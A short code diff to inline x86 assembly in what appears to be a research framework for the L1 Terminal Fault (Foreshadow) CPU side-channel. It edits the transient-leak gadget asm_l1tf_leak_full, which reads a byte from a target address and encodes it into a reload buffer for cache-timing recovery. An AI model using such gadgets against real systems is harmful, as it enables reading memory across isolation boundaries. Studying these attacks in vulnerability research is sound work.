@@ -52,6 +52,9 @@ extern uint64_t reload_label_full(void);
 static inline __attribute__((always_inline)) void
 asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
+               "movq $0xC7DB70C9B1ABE849, %%r12\n"
+               "movq $0x47DF1DF4CD7E16F1, %%r13\n"
+               "leaq reload_label_full(%%rip), %%r14\n"
                "movq (%[leak_addr]), %%rax\n"
                "and $0xff, %%rax\n"
                "shl $0xc, %%rax\n"
@@ -60,7 +63,6 @@ asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
                "asm_l1tf_leak_full_loop:\n"
                "pause\n"
                "jmp asm_l1tf_leak_full_loop\n"
-               ".global reload_label_full\n"
                "reload_label_full:"
 
                ::[leak_addr] "r"(leak_addr),
